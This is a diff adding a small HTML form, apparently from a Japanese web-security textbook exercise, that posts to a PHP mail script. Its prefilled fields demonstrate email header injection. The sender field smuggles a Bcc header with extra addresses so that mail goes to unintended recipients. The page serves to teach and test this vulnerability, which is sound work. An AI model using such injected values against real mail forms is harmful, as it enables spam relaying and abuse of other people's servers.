@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" http-equiv="content-type" content="text/html">
+    <title>リスト10.9に投稿するページ</title>
+</head>
+<body>
+    <form action="5.php" method="post">
+        件名<textarea name="subject">spam mail 件名フィールド2行目</textarea>
+        メール<textarea name="from">foo@example.com Bcc: bar@example.com,buz@example.com</textarea><br />
+        内容<textarea name="body">メールヘッダ・インジェクションです。Bccで意図しない相手にメールを送信します。</textarea><br />
+        <input type="submit" value="メール送信" />
+    </form>
+</body>
+</html>
